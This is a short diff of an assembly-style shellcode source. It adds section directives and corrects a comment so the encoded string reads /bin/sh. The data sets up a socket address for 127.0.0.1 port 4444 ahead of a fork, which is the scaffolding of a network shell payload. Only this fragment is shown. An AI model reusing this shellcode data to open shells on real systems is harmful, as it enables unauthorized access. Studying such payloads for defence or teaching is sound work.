@@ -2,12 +2,15 @@
 # uses only .start label and DB,DW,DD and DQ pseudo instructions
 
 ## data
-DQ 0x0068732f6e69622f # /bin/cat
+.section .ro
+dq 0x0068732f6e69622f # /bin/sh
 DQ 0x0000000000000078 # 1st argument - name of the file executed 
 DQ 0x0000000000000000 
 DQ 0x0100007F5c110002 # 0002 - AF_INET, 5C 11 - 4444, 7F 00 00 01 - 127.0.0.1 
 
 #0x98
+
+.section .text
 
 # fork
 .start
